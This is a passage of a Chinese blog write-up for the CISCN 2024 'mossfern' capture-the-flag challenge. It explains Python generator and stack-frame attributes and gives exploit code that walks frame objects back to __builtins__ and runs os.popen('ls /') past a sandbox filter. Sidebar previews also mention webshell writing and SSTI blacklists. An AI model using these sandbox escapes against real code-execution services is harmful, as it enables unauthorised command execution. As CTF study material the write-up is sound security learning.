+<p><code>gi_yieldrom</code>：如果生成器正在从另一个生成器中<code>yield</code>值，则在该生成器对象的引用，否则为None</p>
+<h4 id="栈帧属性"><a href="#栈帧属性" class="headerlink" title="栈帧属性"></a>栈帧属性</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">栈帧包含了以下几个重要的属性：</span><br><span class="line">f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。</span><br><span class="line">f_globals: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</span><br><span class="line">f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。</span><br><span class="line">f_lasti: 整数，表示最后执行的字节码指令的索引。</span><br><span class="line">f_back: 指向上一级调用栈帧的引用，用于构建调用栈。</span><br></pre></td></tr></table></figure>
+
+<p>用它给的例子可以看出规律</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import pdb</span><br><span class="line">def f():</span><br><span class="line">    # yield 1</span><br><span class="line">    yield g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line">print(&quot;------------------start------------------&quot;)</span><br><span class="line">print(g)</span><br><span class="line">frame = next(g)</span><br><span class="line"></span><br><span class="line"># pdb.set_trace()</span><br><span class="line">print(frame)</span><br><span class="line">print(frame.f_back)</span><br><span class="line">print(frame.f_back.f_back)</span><br><span class="line">print(frame.f_back.f_back.f_back)</span><br><span class="line">print(frame.f_back.f_back.f_back.f_back)</span><br><span class="line">print(frame.f_back.f_back.f_back.f_back.f_back)</span><br><span class="line">print(frame.f_back.f_back.f_back.f_back.f_back.f_back)</span><br><span class="line">print(&quot;------------------end------------------&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>不打断点报错，打完是一步一步往回走，最后找全局属性flag</p>
+<p>源码审计</p>
+<ul>
+<li>run路由下是创建临时文件写入用户传入的python代码去执行</li>
+<li>runner.py里面是过滤</li>
+</ul>
+<p>直接贴exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def exp():</span><br><span class="line">    def scq():</span><br><span class="line">        yield scq.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    scq = scq()</span><br><span class="line"></span><br><span class="line">    # frame = next(scq)</span><br><span class="line">    frame=[x for x in scq][0]</span><br><span class="line">    print(frame)</span><br><span class="line">    print(frame.f_back)</span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_globals[&quot;_&quot;*2+&quot;builtins&quot;+&quot;_&quot;*2]</span><br><span class="line"></span><br><span class="line">    getflag = frame.f_back.f_back.f_back.f_code</span><br><span class="line"></span><br><span class="line">    dir = gattr.dir</span><br><span class="line">    print(dir(getflag))</span><br><span class="line"></span><br><span class="line">    for i in getflag.co_consts:</span><br><span class="line">        print(i)</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<p>下边这个没回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">builtins = [a:=[],d:=a.append,d([b.gi_frame.f_back.f_back.f_globals]for b in a),*a[0]][-1][0][&quot;_&quot;&quot;_builtins_&quot;&quot;_&quot;]</span><br><span class="line">eval = builtins.eval</span><br><span class="line">flag = eval(&quot;_&quot;&quot;_import_&quot;&quot;_(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;, &#123;&quot;_&quot;&quot;_builtins_&quot;&quot;_&quot;: builtins&#125;)</span><br><span class="line">print(flag[::-1])</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG=dSMOkdxWD&amp;alichlgref=https://www.bing.com/</span><br></pre></td></tr></table></figure>
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/">http://example.com/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">2025元旦渗透赛复现-ctfshow</div></div><div class="info-2"><div class="info-item-1">2025ctfshow元旦渗透赛第一章flag1-压缩包压缩包密码爆破  flag2-图片-密码压缩包里面有个图片 PNG 文件的尾部标识符 49 45 4E 44 AE 42 60 82  提取出后边多余的文件base64解密👇出来个这个 1234567if __name__ == &#x27;__main__&#x27;:    try:        import secretMessageResponse    except ImportError:        import pip        pip.main([&#x27;install&#x27;, &#x27;secretMessageResponse&#x27;])        from secretMessageResponse import printMessage  拿python运行一下没出来一堆数据 去找库👇 pip show secretMessageResponse  crypto环境问题from Crypto.PublicKey import RSA...</div></div></div></a><a class="pagination-related" href="/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" title="红日靶场12457"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">红日靶场12457</div></div><div class="info-2"><div class="info-item-1">+红日靶场1配置说明：虚拟机所有初始密码都为hongrisec@2019（后面需要改密码，自己设置） 12我修改为lidd@800  win7 要把打印机协议打开 1234本地--域192.168.52.143本地5192.168.57.3  win2008 12本地192.168.52.138  win2k3 1192.168.236.141  在win7的phpstudy打开服务，打不开就重启一次 本地可以访问，其他用户无法访问 1https://blog.csdn.net/liuhhaiffeng/article/details/72137102   开打1nmap -sV 192.168.57.3  漏洞点一rogue_mysql任意文件读取，但是得盲猜，还要当前用户有权限    二 数据库弱口令日志写码1234查看日志状态： show variables like &#x27;%general%&#x27;; 开启general_log为True： SET GLOBAL general_log=&#x27;on&#x27;; 执行命令指定日志写马： SET...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/12/08/2024polar-winter/" title="2024polar-winter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="info-item-2">2024polar-winter</div></div><div class="info-2"><div class="info-item-1">2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析 复现123&lt;script&gt;confirm(1);&lt;/script&gt;按提示去xss;提示如下↓就c你o还n想f弹i窗r,m  给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行  【WEB】狗黑子的RCEps看进程，里面没事，env看环境变量，有个假flag   打开文件使用函数替换 rev strings  查看目录文件使用函数替换 find &#x2F;       **find**列出目录及其子目录中的文件。 出flag.php   du &#x2F;       ...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2025元旦渗透赛复现-ctfshow</div></div><div class="info-2"><div class="info-item-1">2025ctfshow元旦渗透赛第一章flag1-压缩包压缩包密码爆破  flag2-图片-密码压缩包里面有个图片 PNG 文件的尾部标识符 49 45 4E 44 AE 42 60 82  提取出后边多余的文件base64解密👇出来个这个 1234567if __name__ == &#x27;__main__&#x27;:    try:        import secretMessageResponse    except ImportError:        import pip        pip.main([&#x27;install&#x27;, &#x27;secretMessageResponse&#x27;])        from secretMessageResponse import printMessage  拿python运行一下没出来一堆数据 去找库👇 pip show secretMessageResponse  crypto环境问题from Crypto.PublicKey import RSA...</div></div></div></a><a class="pagination-related" href="/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="24国城杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">24国城杯</div></div><div class="info-2"><div class="info-item-1">2024国城杯1Easy Jellyjava欠着 2Ez_Gallery 账号admin；密码123456；直接爆也行，验证码可以重复用  存在文件包含，不知道flag在哪 info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码 源码的shell路由是个ssti攻击点 黑名单 12345678blacklist_patterns = [r&#x27;.*length.*&#x27;,r&#x27;.*count.*&#x27;,r&#x27;.*[0-9].*&#x27;,r&#x27;.*\..*&#x27;,r&#x27;.*soft.*&#x27;]if any(re.search(pattern, expression) for pattern in blacklist_patterns):return Response(&#x27;wafwafwaf&#x27;)try:result...</div></div></div></a><a class="pagination-related" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24强网杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-26</div><div class="info-item-2">24强网杯</div></div><div class="info-2"><div class="info-item-1">24强网PyBlockly题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158from flask import Flask, request, jsonifyimport reimport unidecodeimport stringimport astimport sysimport...</div></div></div></a><a class="pagination-related" href="/2024/12/03/wucup/" title="2024WuCup-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-03</div><div class="info-item-2">2024WuCup-wp</div></div><div class="info-2"><div class="info-item-1">wucup-DDLmisc太极   1234567891011tai ji sheng liang yiliang yi sheng si xiangsi xiang sheng ba guaba gua ding ji xiongji xiong sheng da yetieny   12341---太极亦是轮回lieig     123 2(1212 -4) 5   ----周而复始sieau      1232 2(12312)jieay        12321(12121)   元神WuCup{0e49b776-b732-4242-b91c-8c513a1f12ce}  WuCup{7c16e21c-31c2-439e-a814-bba2ca54101a} 把docx文件换成zip文件  模糊的这个东西，减淡加弱化 WuCup{6bb9d97d-7169-434b-a7cf-0ee0b6fdfa30}      ...</div></div></div></a><a class="pagination-related" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="info-item-2">第二届CN-fnst::CTF</div></div><div class="info-2"><div class="info-item-1">CN-fnst::CTFweb1ez_python盲猜是文件包含file题目是python，读取源码；看到shell路由有个ssti  再看看waf &#x2F;?file&#x3D;&#x2F;app&#x2F;waf.py 123456def waf_check(value):    dangerous_patterns = [&#x27;os&#x27;, &#x27;set&#x27;, &#x27;__builtins__&#x27;, &#x27;=&#x27;, &#x27;.&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;popen&#x27;, &#x27;+&#x27;, &#x27;__&#x27;]    for pattern in dangerous_patterns:        if pattern in value:            return False    return...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024ciscn%E7%AC%AC%E4%B8%80%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">2024ciscn第一场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sanic"><span class="toc-number">1.1.</span> <span class="toc-text">sanic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-number">1.1.3.</span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-number">1.1.4.</span> <span class="toc-text">第三步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.1.5.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.1.6.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">1.3.</span> <span class="toc-text">simple_php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">1.4.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mossfern"><span class="toc-number">1.5.</span> <span class="toc-text">mossfern</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-number">1.5.1.</span> <span class="toc-text">生成器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">生成器表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E5%B1%9E%E6%80%A7"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">生成器属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7%E5%B1%9E%E6%80%A7"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">栈帧属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">1.5.2.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow">2025元旦渗透赛复现-ctfshow</a><time datetime="2025-01-16T08:51:44.000Z" title="Created 2025-01-16 16:51:44">2025-01-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现">2024第一场ciscn-ctfshow复现</a><time datetime="2025-01-16T08:46:00.000Z" title="Created 2025-01-16 16:46:00">2025-01-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" title="红日靶场12457">红日靶场12457</a><time datetime="2024-12-26T13:22:52.000Z" title="Created 2024-12-26 21:22:52">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24强网杯">24强网杯</a><time datetime="2024-12-26T13:20:17.000Z" title="Created 2024-12-26 21:20:17">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF">第二届CN-fnst::CTF</a><time datetime="2024-12-17T07:30:42.000Z" title="Created 2024-12-17 15:30:42">2024-12-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
